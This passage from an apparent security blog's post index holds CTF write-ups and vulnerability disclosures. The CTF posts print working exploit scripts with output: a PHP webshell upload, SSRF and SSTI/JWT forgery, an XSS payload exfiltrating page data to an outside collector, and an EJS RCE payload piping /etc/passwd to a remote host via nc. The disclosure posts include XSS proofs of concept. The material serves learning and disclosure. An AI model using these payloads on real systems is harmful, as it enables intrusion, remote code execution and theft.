$_POST['pw'];    if(!$id || !$pw) alert('invalid input', 'back');    if(!is_valid_id($id)) alert('invalid id', 'back');    if(is_exists_user($id)){        alert('already joined', 'back');    }    save_user_id($id, $pw);    alert('welcome', '/');    // /var/www/html/pages/register.php?&gt;We can upload the PHP file because we do not validate the user id parameter in the signup logic.import requests import string import randomCHALLURL = \"http://3.37.8.189:5580\"LENGTH = 5CONTENT = \"&lt;?php echo system($_GET['x']);?&gt;\"string_pool = string.digitsfilename = \"\"for i in range(LENGTH):    filename += random.choice(string_pool) FILENAME = filename + '.php'print(f'[+] FILANAME : {FILENAME}')requests.post(CHALLURL + \"/?b=register&amp;a=register\", data={'id':FILENAME, 'pw':CONTENT})while(1):    payload = input(\"[+] Enter the command : \")    RESULT = requests.get(CHALLURL + f'/?b=login&amp;a=../../dbs/{filename}&amp;x={payload}').text    print(RESULT)I wrote the exploit code as above.❯ python3 poc.py   [+] FILANAME : 37106.php[+] Enter the command : ids:32:\"uid=33(www-data) gid=33(www-data) groups=33(www-data)uid=33(www-data) gid=33(www-data) groups=33(www-data)\";[+] Enter the command : cat /flags:32:\"cce2022{ce9237924b58afdf2a164345ddd8265e49f210abc75ab12002eb6f6a32109d293a992b99214eae312f9f33131458dbc0e8c17485364fec867a241b1b}cce2022{ce9237924b58afdf2a164345ddd8265e49f210abc75ab12002eb6f6a32109d293a992b99214eae312f9f33131458dbc0e8c17485364fec867a241b1b}\";BabyWebThis is a challenge of SSRF using different URL parsing methods.@app.route('/', methods=['GET','POST'])def index():    if request.method == \"POST\":        try:            url = request.form['url']            result = urllib.parse.urlparse(url)            if result.hostname == 'flag.service':                return \"Not allow\"            else:                if(valid_ip(result.hostname)):                    return \"huh??\"                else:                    return requests.get(\"http://\"+result.hostname+result.path, allow_redirects=False).text        except:            return \"Something wrong...\"    elif request.method == \"GET\":        return dataLooking at the code, hostname should not be flag.service. And it must be a valid IP.version: '3'services:  challenge:    build:      context: .      dockerfile: ./public/Dockerfile    ports:       - \"80:80\"    links:      - flag.service  flag.service:    build:      context: .      dockerfile: ./internal/Dockerfile  However, since the URL of the internal server is flag.service, you need to send a request to flag.service.from flask import Flaskfrom flask import requestfrom secret import FLAGapp = Flask(__name__)@app.route('/flag', methods=['GET'])def index():    if request.host == \"flag.service\":        return FLAG    else:        return \"Nice try :)\"if __name__ == \"__main__\":    app.run(host=\"0.0.0.0\", port=80)We can get the flags by sending a request to http://flag.service/flagimport requestsCHALLURL = 'http://localhost/' # http://3.38.33.163/hostname = ''parse_hostname = list('flag.service')for s in parse_hostname:    hostname += hex(ord(s)).replace('0x','%')url = f'http://{hostname}/flag'print(url)FLAG = requests.post(CHALLURL, data={'url':url}).textprint(f'FLAG is {FLAG}')'''http://%66%6c%61%67%2e%73%65%72%76%69%63%65/flagFLAG is cce2022{this_is_not_real_flag}'''This can be easily solved as above. When parsing a url, the hostname is parsed in the url-encoded state, but when sending a request, the url-encoded hostname is decoded.blue archive - webThis is a challenge for using simple XSS.const crypto = require('crypto');const fs = require('fs');const moment = require('moment');const puppeteer = require('puppeteer');const sandbox_url = `http://sandbox.bluearchive.kr:${process.env.PORT}/?url=`const config = require('./config');async function saveArchive(url) {    const hash = crypto.createHmac('sha256', config.SECRET).update(url).digest('hex');    const archive_dir = `${config.ARCHIVE_DIR}/${hash}`;    if (!fs.existsSync(archive_dir))        fs.mkdirSync(archive_dir);    const timestamp = moment().format('YYYYMMDDHHmmssSSS');    const archive_path = `${archive_dir}/${timestamp}.${config.ARCHIVE_EXT}`;    const browser = await puppeteer.launch({        executablePath: './chrome/chrome',        ignoreDefaultArgs: true,        args: [            '--headless',            '--diable-gpu',            '--disable-dev-shm-usage',            '--ignore-certificate-errors',            '--hide-scrollbars',            '--window-size=1280,720',            \"--js-flags=--noexpose_wasm,--jitless\"        ],    });    const page = await browser.newPage();    await page.goto(sandbox_url + url, { timeout: 3000 });    await new Promise(resolve =&gt; setTimeout(resolve, 3000));    await page.screenshot({        fullPage: true,        path: archive_path,    });    await browser.close();}module.exports = { saveArchive };// /app/lib.jsThere is a function called saveArchive() in lib.js. This function uses puppeteer to open an arbitrary browser in the background. After that, the file-related logic is moved to the sandbox url after execution.router.post('/archiveSave', async (req, res) =&gt; {    const { url } = req.body;    if (typeof url !== 'string' ||        !(url.startsWith('http://') || url.startsWith('https://')))        return res.status(400).render('index', { error : 'Invalid URL.' });    try {        await saveArchive(url);        return res.status(200).render('index', { success : `Sucessfully saved archive for ${url}` });    } catch (e) {        console.log(e)        return res.status(500).render('index', { error : 'Oops, an unknown error has occured.' });    }});// /app/route/routes.jsThe saveArchive() function is called when creating an archive.const express = require('express')const { encode } = require(\"html-entities\");const app = express()app.get('/', function (req, res) {    data = `&lt;html&gt;&lt;head&gt;&lt;title&gt;sandbox&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;FLAG = \"cce2022{this_is_not_real_flag}\"&lt;/script&gt;&lt;iframe src=\"${encode(req.query.url)}\" style=\"width: 100%; height: 100%; border: 0\"&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;`    res.setHeader(\"Content-Type\",\"text/html\").send(data);})app.listen(process.env.PORT);// /sandbox/src/index.jsWhen I checked the code of /sandbox/src/index.js, I could see that there was a FLAG in the Dom. And it gets the value of the url parameter from the iframe part and passes it as the value of src as it is. We can trigger XSS because we can manipulate the value of src at will.The structure of the dome is as above. The vulnerability occurs in Iframes. But the flag is in Parent Dom.So we must read the value of window.parent.document.body. If the value of document.body is read, the document of the only iframe is read.http://sandbox.bluearchive.kr:31337/?url=javascript:location.href=%2527https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/%2527%252Bbtoa(window.parent.document.body.innerHTML)We can get the flags by sending the above payload to the archive creation logiccce2022{65f6d035ca6640b9ac8e19ff725a747f}"
  },
  
  {
    "title": "SSTF 2022 JWT Decoder Write Up",
    "url": "/posts/SSTF/",
    "categories": "",
    "tags": "",
    "date": "2022-08-23 13:00:53 +0900",
    





    
    "snippet": "I participated in the CTF called sstf after 5 months. Today, I wrote that how to solve a JWT Decoder.~/Downloads/prob❯ tree -I \"node_modules\".├── Dockerfile├── docker-compose.yml├── flag.txt└── ser...",
    "content": "I participated in the CTF called sstf after 5 months. Today, I wrote that how to solve a JWT Decoder.~/Downloads/prob❯ tree -I \"node_modules\".├── Dockerfile├── docker-compose.yml├── flag.txt└── server    ├── app.js    ├── nc    ├── package-lock.json    ├── package.json    └── view        └── index.ejs2 directories, 8 files~/Downloads/prob❯They provided the file as above.{  \"dependencies\": {    \"cookie-parser\": \"^1.4.6\",    \"ejs\": \"^3.1.6\",    \"express\": \"^4.17.3\"  }}And when i check the package.json, I could know to use ejs 3.1.6 version. Already many researcher know about how to trigger an RCE in ejs environment. When the ejs parser is working, it make a javascript code as dynamic and then execute it. At the time, there are some gadgets. this gadget is outputFunctionName and destructuredLocals.While making javascript code, it use after get a value in opts object. But, Normally If you want to pollute a value of opts.outputFunctionName, A Prototype Pollution vulnerability must exist. But there is no.        viewOpts = data.settings['view options'];        if (viewOpts) {          utils.shallowCopy(opts, viewOpts);        }// https://github.com/mde/ejs/blob/v3.1.6/lib/ejs.js#L473L476I found that using the utils.shallowCopy() method in the EJS code to overwrite the value of data.settings.view.options with the properties of the opts object.const express = require('express');const cookieParser = require('cookie-parser');const path = require('path');const app = express();const PORT = 3000;app.use(cookieParser());app.set('views', path.join(__dirname, \"view\"));app.set('view engine', 'ejs');app.get('/', (req, res) =&gt; {    let rawJwt = req.cookies.jwt || {};    try {        let jwtPart = rawJwt.split('.');        let jwtHeader = jwtPart[0];        jwtHeader = Buffer.from(jwtHeader, \"base64\").toString('utf8');        jwtHeader = JSON.parse(jwtHeader);        jwtHeader = JSON.stringify(jwtHeader, null, 4);        rawJwt = {            header: jwtHeader        }        let jwtBody = jwtPart[1];        jwtBody = Buffer.from(jwtBody, \"base64\").toString('utf8');        jwtBody = JSON.parse(jwtBody);        jwtBody = JSON.stringify(jwtBody, null, 4);        rawJwt.body = jwtBody;        let jwtSignature = jwtPart[2];        rawJwt.signature = jwtSignature;    } catch(error) {        if (typeof rawJwt === 'object') {            rawJwt.error = error;        } else {            rawJwt = {                error: error            };        }    }    res.render('index', rawJwt);});app.use(function(err, req, res, next) {    console.error(err.stack);    res.status(500).send('Something wrong!');});app.listen(PORT, (err) =&gt; {    console.log(`Server is Running on Port ${PORT}`);});This is the challenge code. It was found that the value of the cookie was taken, divided by “.”, and the values of the header, body, and signature of JWT were put into an object called rawJwt. However, we cannot insert Object because all values are converted back to strings after the strings are converted to JSON type.Anyway, I could know that the rawJwt object is created and passed as the second argument to the render() method.exports.render = function (template, d, o) {  var data = d || {};  var opts = o || {};  // No options object -- if there are optiony names  // in the data, copy them to options  if (arguments.length == 2) {    utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA);  }  return handleCache(opts, template)(data);};// https://github.com/mde/ejs/blob/v3.1.6/lib/ejs.js#L413L424The second argument to the render() method goes into the data object. So we have to insert an user-defined object to rawJwt object.function JSONCookie (str) {  if (typeof str !== 'string' || str.substr(0, 2) !== 'j:') {    return undefined  }  try {    return JSON.parse(str.slice(2))  } catch (err) {    return undefined  }}/** * Parse JSON cookies. * * @param {Object} obj * @return {Object} * @public */function JSONCookies (obj) {  var cookies = Object.keys(obj)  console.log(cookies)  var key  var val  console.log(cookies)  for (var i = 0; i &lt; cookies.length; i++) {    key = cookies[i]    val = JSONCookie(obj[key])    if (val) {      obj[key] = val    }  }  return obj}// https://github.com/expressjs/cookie-parser/blob/master/index.js#L83L118We generally cannot insert object data into rawJwt objects. However, as a result of analyzing the code of the cookie-parser module, I was able to find out the JsonCookie () function. The JsonCookie () function converts the argument value to JSON in the try statement if it starts with j: when the value of the argument is an object.j:{  \"settings\":{    \"view options\":{      \"outputFunctionName\":\"x;process.mainModule.require('child_process').execSync('cat /etc/passwd | nc pocas.kr 9999')//\"    }  }}I wrote the payload as aboveWhen I sent the payload, I could see that RCE occurred as above."
  },
  
  {
    "title": "Outlook, XSS Sanitizer flaw",
    "url": "/posts/MSRC-1/",
    "categories": "",
    "tags": "Microsoft",
    "date": "2022-06-06 21:34:45 +0900",
    





    
    "snippet": "SummaryThe outlook web app service is a mail service provided by Microsoft. A researcher named Max discovered a Copy and Paste XSS vulnerability in the web service in 2021.However, I was able to by...",
    "content": "SummaryThe outlook web app service is a mail service provided by Microsoft. A researcher named Max discovered a Copy and Paste XSS vulnerability in the web service in 2021.However, I was able to bypass that patch using the &lt;template&gt; tag. Yea this was a simple Sanitizer bypass where I could inject an &lt;iframe&gt;, &lt;script&gt; tag.Timeline (KST)  2022-03-15 15h 00m : Reported this issue via the msrc  2022-03-15 01h 37m : Status changed to New  2022-03-17 06h 27m : Status changed from New to Review / Repro  2022-04-09 08h 33m : Status changed from Review / Repro to Develop  2022-04-26 02h 26m : Status changed from Develop to Pre-Release  2022-05-21 07h 02m : Status changed from Pre-Release to CompleteReference  Report"
  },
  
  {
    "title": "Dreamhack, Leak all write ups via IDOR",
    "url": "/posts/IDOR-DR/",
    "categories": "",
    "tags": "",
    "date": "2022-05-16 21:34:45 +0900",
    





    
    "snippet": "Summary  The dreamhack is a security education program managed by Theori. In dreamhack, Users can solve wargame challenges and write solutions. At this time, the user can write the solution for a f...",
    "content": "Summary  The dreamhack is a security education program managed by Theori. In dreamhack, Users can solve wargame challenges and write solutions. At this time, the user can write the solution for a fee/free of charge.I found a vulnerability that could leak all of DreamHack’s Wargame Write Up using a simple IDOR. Unfortunately, I didn’t leak all Write Ups using that vulnerability.Reporting Timeline  2022-04-04 15h 28m : Reported this issue via the patchday  2022-04-28 01h 37m : Status changed to new by patchday  2022-05-06 18h 01m : Status changed to classified by saika  2022-05-06 18h 13m : Status changed to fixed by saika  2022-05-06 18h 13m : Vulnerability score changed 3pts to 6pts by saika  2022-05-06 18h 13m : Bounty was set at 500,000 won by saika  2022-05-06 18h 14m : Status changed to payment in progress by saikaReference  Report"
  },
  
  {
    "title": "0-Day, Cross-Site Scripting via markdown syntax (Vditor)",
    "url": "/posts/xss-vditor/",
    "categories": "",
    "tags": "",
    "date": "2022-04-02 21:34:45 +0900",
    





    
    "snippet": "Summary  The vanessa219/vditor is a markdown editor supported by browsers. There were two vulnerabilities.First vulnerability, When a user creates a link using the markdown syntax, the server does ...",
    "content": "Summary  The vanessa219/vditor is a markdown editor supported by browsers. There were two vulnerabilities.First vulnerability, When a user creates a link using the markdown syntax, the server does not URL-encode the double-quotes, so the user can escape the href attribute and trigger XSS using the on* attribute. Second vulnerability, If the user passes javascript:alert(document.domain) as the URL value when creating a link using the markdown syntax, there is no sanitizing process and the link is created as it is. Both vulnerabilities were patched in v3.8.13 version, and occur in v3.8.12 v3.8.11.  CVE-2022-0341          Proof of Concept      Reporting Timeline      Reference        CVE-2022-0350          Proof of Concept      Reporting Timeline      Reference      CVE-2022-0341Proof of Concept (0341)XSS PoC : [xss](https://google.com/\"//onmousemove=\"alert(document.domain))&gt; I can insert an onerror. But I can't log in without a Chinese phone number, so I can't test1. Open the vanessa219/vditor2. Enter the XSS PoC (Strangely, it doesn't insert at once, so I have to try inserting several times)3. When the user hovers the mouse over the link, XSS is triggered via a mouse event.Video : https://www.youtube.com/watch?v=pKQMbrezdCsReporting Timeline (0341)  2022-01-23 12h 24m : Reported this issue via the huntr  2022-01-24 13h 06m : Validated this issue by vanessa219  2022-01-24 13h 06m : Assigned a CVE-2022-0341  2022-03-14 10h 56m : Patched this issue by vanessa219Reference (0341)  Github Commit  Huntr  Mitre  NVD  SnykCVE-2022-0350Proof of Concept (0350)XSS PoC : [xss](javascript:alert(document.domain))1. Open the vanessa219/vditor2. Enter the XSS PoC3. Click the LinkVideo : https://www.youtube.com/watch?v=5zzdiBivNSsReporting Timeline (0350)  2022-01-24 13h 11m : Reported this issue via the huntr  2022-01-25 00h 11m : Validated this issue by vanessa219/vditor  2022-01-25 00h 11m : Assigned a CVE-2022-0350  2022-03-31 22h 57m : Patched this issue by vanessa219Reference (0350)  Github Commit  Huntr  Mitre  NVD  Snyk"
  },
  
  {
    "title": "Line CTF 2022 Write Up",
    "url": "/posts/Line-CTF/",
    "categories": "",
    "tags": "",
    "date": "2022-03-27 18:00:53 +0900",
    





    
    "snippet": "Summary  Summary  (Web) gotm  (Web) online-libraryI participated a Line CTF 2022 this saturday and I only solved the one challenge in this ctf.So I am very not good. Just get a stress. So I decided...",
    "content": "Summary  Summary  (Web) gotm  (Web) online-libraryI participated a Line CTF 2022 this saturday and I only solved the one challenge in this ctf.So I am very not good. Just get a stress. So I decided not to participate the CTF from today. I always think like: When we live the life, must do a lot of things. Oh, I’m not quitting IT. I just want to try different things. Still, if I don’t like it, I’ll find another job.(Web) gotmThe gotm is challenge that get the flag using a JWT of admin. And goth challenge was created using Golang.func main() {\tadmin := Account{admin_id, admin_pw, true, secret_key}\tacc = append(acc, admin)\thttp.HandleFunc(\"/\", root_handler)\thttp.HandleFunc(\"/auth\", auth_handler)\thttp.HandleFunc(\"/flag\", flag_handler)\thttp.HandleFunc(\"/regist\", regist_handler)\tlog.Fatal(http.ListenAndServe(\"0.0.0.0:11000\", nil))}If you look at the main() function, you can know that set the router like: /, /auth, /flag, /regist.func flag_handler(w http.ResponseWriter, r *http.Request) {\ttoken := r.Header.Get(\"X-Token\")\tif token != \"\" {\t\tid, is_admin := jwt_decode(token)\t\tif is_admin == true {\t\t\tp := Resp{true, \"Hi \" + id + \", flag is \" + flag}\t\t\tres, err := json.Marshal(p)\t\t\tif err != nil {\t\t\t}\t\t\tw.Write(res)\t\t\treturn\t\t} else {\t\t\tw.WriteHeader(http.StatusForbidden)\t\t\treturn\t\t}\t}}First of all, If you look at the condition that bring a flag, If the is_admin of JWT is true, you can bring the flag.func regist_handler(w http.ResponseWriter, r *http.Request) {\tuid := r.FormValue(\"id\")\tupw := r.FormValue(\"pw\")\tif uid == \"\" || upw == \"\" {\t\treturn\t}\tif get_account(uid).id != \"\" {\t\tw.WriteHeader(http.StatusForbidden)\t\treturn\t}\tif len(acc) &gt; 4 {\t\tclear_account()\t}\tnew_acc := Account{uid, upw, false, secret_key}\tacc = append(acc, new_acc)\tp := Resp{true, \"\"}\tres, err := json.Marshal(p)\tif err != nil {\t}\tw.Write(res)\treturn}But, When I look at the regist_handler() function, I could know that I cannot make the is_admin of JWT as true because it’s adds the is_admin as false.func auth_handler(w http.ResponseWriter, r *http.Request) {\tuid := r.FormValue(\"id\")\tupw := r.FormValue(\"pw\")\tif uid == \"\" || upw == \"\" {\t\treturn\t}\tif len(acc) &gt; 1024 {\t\tclear_account()\t}\tuser_acc := get_account(uid)\tif user_acc.id != \"\" &amp;&amp; user_acc.pw == upw {\t\ttoken, err := jwt_encode(user_acc.id, user_acc.is_admin)\t\tif err != nil {\t\t\treturn\t\t}\t\tp := TokenResp{true, token}\t\tres, err := json.Marshal(p)\t\tif err != nil {\t\t}\t\tw.Write(res)\t\treturn\t}\tw.WriteHeader(http.StatusForbidden)\treturn}Even when logging in, it cannot be manipulated because the stored is_admin is used.func root_handler(w http.ResponseWriter, r *http.Request) {\ttoken := r.Header.Get(\"X-Token\")\tif token != \"\" {\t\tid, _ := jwt_decode(token)\t\tacc := get_account(id)\t\ttpl, err := template.New(\"\").Parse(\"Logged in as \" + acc.id)\t\tif err != nil {\t\t}\t\ttpl.Execute(w, &amp;acc)\t} else {\t\treturn\t}}However, an SSTI vulnerability occurs in the index. This is because the ID value is passed raw to the template engine. Here, if a payload such as \\{\\{ . \\}\\} is used, the values of all elements of the currently logged in user can be output.type Account struct {\tid         string\tpw         string\tis_admin   bool\tsecret_key string}Since the structure of Account is the same as above, you can have the secret_key by using the SSTI vulnerability. So just leak secret_token, set is_admin of JWT to true and generate token. And you can use that token to get the flag.import requestsimport jwtCHALL_URL = \"http://34.146.226.125\"#CHALL_URL = \"http://localhost:11000\"USERNAME = \"\\{\\{  .      }}\"PASSWORD = \"dummy\"SESSION = requests.Session()def REGIST(ID, PW):    data = {'id':ID, 'pw':PW}    try:        res = SESSION.post(CHALL_URL + '/regist', data=data).json()        if res['status'] == True:            print(f'[+] Register Success : {ID}')        else:            print('[+] 500 Inter Server Error')    except:        print('[+] 500 Inter Server Error')def LOGIN(ID, PW):    data = {'id':ID, 'pw':PW}      try:        res = SESSION.post(CHALL_URL + '/auth', data=data).json()        if res['status'] == True:            token = res['token']            print(f'[+] TOKEN : {token}')            header = {'X-Token':token}            SECRET_KEY = SESSION.get(CHALL_URL, headers=header).text.split('false ')[1].replace('}', '')            return SECRET_KEY        else:            print('[+] 500 Inter Server Error')    except:         print('[+] 500 Inter Server Error')def FLAG(ADMIN_TOKEN):    header = {'X-Token':ADMIN_TOKEN}    RESULT = SESSION.get('http://34.146.226.125/flag', headers=header).json()    FLAG = RESULT['msg'].split('flag is ')[1]    print(f'[-] FLAG : {FLAG}')def JWT_ENCODE(ID, SECRET_KEY):    AccountClaims = {        \"id\": ID,        \"is_admin\": True    }    jwt_token = jwt.encode(key=SECRET_KEY, algorithm='HS256', payload=AccountClaims)    return jwt_tokenif __name__ == '__main__':    print('[+] Exploit')    REGIST(USERNAME, PASSWORD)    print('[+] Leak the SECRET_KEY')    SECRET_KEY = LOGIN(USERNAME, PASSWORD)    print(f'[-] SECRET_KEY : {SECRET_KEY}')    print('[+] Generate the JWT of ADMIN')    ADMIN_JWT = JWT_ENCODE(USERNAME, SECRET_KEY).decode('utf-8')    print(f'[-] ADMIN_JWT : {ADMIN_JWT}')    print('[+] Leak the FLAG')    FLAG(ADMIN_JWT)I wrote the exploit code as above.❯ python3 exploit.py[+] Exploit[+] Register Success : \\{\\{  .      \\}\\}[+] Leak the SECRET_KEY[+] TOKEN : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7ICAuICAgICAgfX0iLCJpc19hZG1pbiI6ZmFsc2V9.thRcBQoJEZUgNF04UMNBYjzww7307fKjCF514rJ0k-0[-] SECRET_KEY : fasdf972u1031xu90zm10Av[+] Generate the JWT of ADMIN[-] ADMIN_JWT : eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6Int7ICAuICAgICAgfX0iLCJpc19hZG1pbiI6dHJ1ZX0.ORLfPXc2HWIjMsORBcoRCRVbsiDJCWC_kntbOAOWXhw[+] Leak the FLAG[-] FLAG : LINECTF{country_roads_takes_me_home}(Web) online-libraryThe online-library is a challenge to trigger XSS using a memory dump file. I have tried this challenge for over 10 hours. Since the LFI vulnerability occurs in this challenge, I tried to insert and trigger an XSS PoC in the log using log poisoning. So I deployed the challenge with docker, and kept looking for all the log related files.I’ve been trying to use /proc/self/fd/N for the last 3-4 hours. But this didn’t work either. I couldn’t figure out how to overwrite the log. I felt very very bad for not being able to solve this challenge. After CTF ended, I found out that it was to trigger XSS by using the node.js request memory dump overwritten in /proc/self/mem. I didn’t even think of this because I wasn’t interested. I didn’t even know before. So the scenario is to just send a request containing the XSS PoC to the web server, and then read the memory dump of the request I sent while increasing the size in the /proc/self/mem file.00400000-0489c000 r-xp 00000000 08:20 44576             /usr/local/bin/node04a9c000-04a9f000 r--p 0449c000 08:20 44576             /usr/local/bin/node04a9f000-04ab7000 rw-p 0449f000 08:20 44576             /usr/local/bin/node04ab7000-04ad8000 rw-p 00000000 00:00 0 069a7000-0745c000 rw-p 00000000 00:00 0                 [heap]5f730c0000-5f73100000 rw-p 00000000 00:00 0 f5af4c0000-f5af500000 rw-p 00000000 00:00 0 146cd280000-146cd2c0000 rw-p 00000000 00:00 0 16dc38c0000-16dc3900000 rw-p 00000000 00:00 0 19f05fc0000-19f06000000 rw-p 00000000 00:00 0 1e7c0fc0000-1e7c1000000 rw-p 00000000 00:00 0 2cdbd900000-2cdbd940000 rw-p 00000000 00:00 0 2eccf1c0000-2eccf241000 rw-p 00000000 00:00 0 2ff788c0000-2ff78900000 rw-p 00000000 00:00 0 350437c0000-35043800000 rw-p 00000000 00:00 0 3d769400000-3d769440000 rw-p 00000000 00:00 0 423fd100000-423fd140000 rw-p 00000000 00:00 0 4327af80000-4327afc0000 rw-p 00000000 00In fact,  In /proc/self/maps, which contains the heap address of virtual memory, I could see that there is the heap address of node.js. I could see that I also have write permission with rw-p. These things are very important. In order for us to hack the web, we need to know these things well. Knowing only simple vulnerability exploitation methods cannot grow. (jjeob)"
  },
  
  {
    "title": "Spring GoN Open Qual CTF 2022 Write Up",
    "url": "/posts/GoN-CTF/",
    "categories": "",
    "tags": "",
    "date": "2022-03-22 08:29:53 +0900",
    





    
    "snippet": "SummaryThis time I did participate in CTF because GoN team of Kaist hosted the CTF. I was hacking to dawn after long time and I solved two challenges:ColorfulMemo, NSS.  [Q] - NSS  [V] - ColorfulMe...",
    "content": "SummaryThis time I did participate in CTF because GoN team of Kaist hosted the CTF. I was hacking to dawn after long time and I solved two challenges:ColorfulMemo, NSS.  [Q] - NSS  [V] - ColorfulMemoI gave up that i felt it’s so hard challenge while analysing this challenge called Trino: Albireo.(Q) - NSS [897 pts]This is a challenge that leak a local file using Prototype Pollution. Personally, this challenge of Prototype Pollution is best I solved latest.❯ tree -I \"node_modules\".├── Dockerfile├── file.js├── flag├── main.js├── package-lock.json├── package.json├── user.js└── workspace.js0 directories, 8 filesthey provided the code of challenge, but it was a little than thought.FROM node:current-alpine3.15WORKDIR /usr/src/appCOPY package*.json ./RUN npm installRUN npm install -g npm@8.5.4COPY . .EXPOSE 80CMD [ \"node\", \"main.js\" ]In docker file, there is no important setting but I could know the location of flag is /usr/src/app/flag.const express = require(\"express\");const bodyParser = require('body-parser');const app = express(); app.use(bodyParser.json());app.listen(80, () =&gt; console.log(\"[*] Server Started!\"));app.get(\"/\", (req, res) =&gt; {    res.status(204);});require('./user.js')(app);require('./workspace.js')(app);require('./file.js')(app);main.js call a total of three Apis:user.js, workspace.js, file.js.const crypto = require('crypto');const fs = require('fs');const os = require('os');const path = require('path');const appPrefix = 'nss';users = {};tokens = {};salt = crypto.randomBytes(128).toString('base64');function check_session(userid, token) {    const sess = tokens[token]    if(!sess) return false;    if(sess.owner != userid) return false;    if(sess.expire &lt; Date.now() / 1000){        tokens.delete(token);        return false;    }    else return true;}function cleanup_user(user) {    fs.rmSync(user.base_dir, {recursive: true});};module.exports = function (app) {    app.get(\"/api/users\", (req, res) =&gt; {        res.status(200).json({res: true, users: Object.keys(users)});    });    app.post(\"/api/users\", (req, res) =&gt; {        const userid = req.body.userid || \"\";        const pass = req.body.pass || \"\";        if(!userid || !pass)            return res.status(400).json({ok: false, err: \"Invalid userid or password\"});        if(pass.length &lt; 10)            return res.status(400).json({ok: false, err: \"Password too short\"});        const user = users[userid];        if(user)            return res.status(400).json({ok: false, err: \"ID already exists\"});        base_dir = \"\"        try {            base_dir = fs.mkdtempSync(path.join(os.tmpdir(), appPrefix));            }        catch {            return res.status(500).json({ok: false, err: \"Internal server error\"});        };        if(!base_dir)             return res.status(500).json({ok: false, err: \"Internal server error\"});                            users[userid] = {            userid : userid,            pass : crypto.createHash('sha512').update(pass + salt).digest('hex'),            workspaces : {},            base_dir: base_dir        };        res.json({ok: true});    });        app.delete(\"/api/users\", (req, res) =&gt; {        const userid = req.body.userid || \"\";        const pass = req.body.pass || \"\";        if(!userid || !token)            return res.status(400).json({ok: false, err: \"Invalid userid or token\"});        if(!check_session(userid, token))            return res.status(403).json({ok: false, err: \"Failed to validate session\"});                const user = users[userid];        cleanup_user(user);        delete user.userid;        return res.status(200).json({ok: true});    });        app.post(\"/api/users/auth\", (req, res) =&gt; {        const userid = req.body.userid || \"\";        const pass = req.body.pass || \"\";        if(!userid || !pass)            return res.status(400).json({ok: false, err: \"Invalid userid or password\"});        const user = users[userid];        if(!user)            return res.status(404).json({ok: false, err: \"Failed to find user\"});        if(user.pass != crypto.createHash('sha512').update(pass + salt).digest('hex'))            return res.status(403).json({ok: false, err: \"Incorrect password\"});                token = crypto.randomBytes(20).toString('hex');        tokens[token] = {            owner : userid,            expire: 30 * 60 + Date.now() / 1000        };        res.json({ok: true, token: token});    });}module.exports.check_session = check_session;module.exports.users = users;module.exports.tokens = tokens;user.js has a function to creating and deleting users and login. If it created user, it put user information into user object. And If login successful, it put user token into tokes object after creating the token using user id. In this point, important point is when it is creating user, it make os.tmpdir()+appPrefix as base_dir. So, default path of user is /tmp*const fs = require('fs');const path = require(\"path\");const user_module = require('./user.js')const check_session = user_module.check_session;const users = user_module.users;function cleanup_workspace(base_dir, workspace){    for (const f_path in Object.values(workspace)) {        fs.rmSync(path.join(base_dir, f_path), {recursive: true});    }}module.exports = function (app) {    app.get(\"/api/users/:userid\", (req, res) =&gt; {        const id = req.params.userid || \"\";        const token = req.body.token || \"\";        if(!userid || !token)            return res.status(400).json({ok: false, err: \"Invalid userid or token\"});        if(!check_session(userid, token))            return res.status(403).json({ok: false, err: \"Failed to validate session\"});        const user = users[userid];        res.status(200).json({ok: true, workspace: Object.keys(user.workspaces)});    });    app.post(\"/api/users/:userid\", (req, res) =&gt; {        const userid = req.params.userid || \"\";        const token = req.body.token || \"\";        const ws_name = req.body.ws_name || \"\";        if(!userid || !token)            return res.status(400).json({ok: false, err: \"Invalid userid or token\"});        if(!check_session(userid, token))            return res.status(403).json({ok: false, err: \"Failed to validate session\"});        users[userid].workspaces[ws_name] = {};        res.json({ok: true});    });    app.delete(\"/api/users/:userid\", (req, res) =&gt; {        const userid = req.params.userid || \"\";        const token = req.body.token || \"\";        const ws_name = req.body.ws_name || \"\";                if(!userid || !token)            return res.status(400).json({ok: false, err: \"Invalid userid or token\"});        if(!check_session(userid, token))            return res.status(403).json({ok: false, err: \"Failed to validate session\"});                const user = users[userid];        if(!ws_name)            return res.status(400).json({ok: false, err: \"Invalid workspace name\"});        const workspace = user.workspaces[ws_name];        if(!workspace)            return res.status(404).json({ok: false, err: \"Failed to find workspace\"});        cleanup_workspace(workspace);        delete user.workspace.ws_name;        return res.status(200).json({ok: true});    });}module.exports.cleanup_workspace = cleanup_workspace;workspace.js too is similar with user.js: making, deleting workspace of user. here is no vulnerability too.const fs = require('fs');const path = require(\"path\");const user_module = require('./user.js')const check_session = user_module.check_session;const users = user_module.users;function write_b64_file(f_path, contents) {    try {        if(!fs.existsSync(path.dirname(f_path)))            fs.mkdirSync(path.dirname(f_path), {recursive: true});        fs.writeFileSync(f_path, contents,{encoding: 'base64'});    } catch (e) {        fs.rmSync(f_path, {recursive: true});        return false;    }    return true;  }function read_b64_file(f_path) {    try{        return fs.readFileSync(f_path, {encoding: 'base64'});    } catch (e) {        return;    }}module.exports = function (app) {    app.get(\"/api/users/:userid/:ws\", (req, res) =&gt; {        const userid = req.params.userid || \"\";        const ws_name = req.params.ws || \"\";        const token = req.body.token || \"\";        if(!userid || !token)            return res.status(400).json({ok: false, err: \"Invalid userid or token\"});        if(!check_session(userid, token))            return res.status(403).json({ok: false, err: \"Failed to validate session\"});        const user = users[userid];        if(!ws_name)            return res.status(400).json({ok: false, err: \"Invalid workspace name\"});        const workspace = user.workspaces[ws_name];        if(!workspace)            return res.status(404).json({ok: false, err: \"Failed to find workspace\"});                res.status(200).json({ok: true, workspace: Object.keys(workspace)});    });    app.post(\"/api/users/:userid/:ws\", (req, res) =&gt; {        const userid = req.params.userid || \"\";        const ws_name = req.params.ws || \"\";        const token = req.body.token || \"\";        const f_name = req.body.file_name || \"\";        const f_path = req.body.file_path.replace(/\\./g,'') || \"\";        const f_content = req.body.file_content || \"\";        if(!userid || !token)            return res.status(400).json({ok: false, err: \"Invalid id or token\"});        if(!check_session(userid, token))            return res.status(403).json({ok: false, err: \"Failed to validate session\"});        const user = users[userid];        if(!ws_name)            return res.status(400).json({ok: false, err: 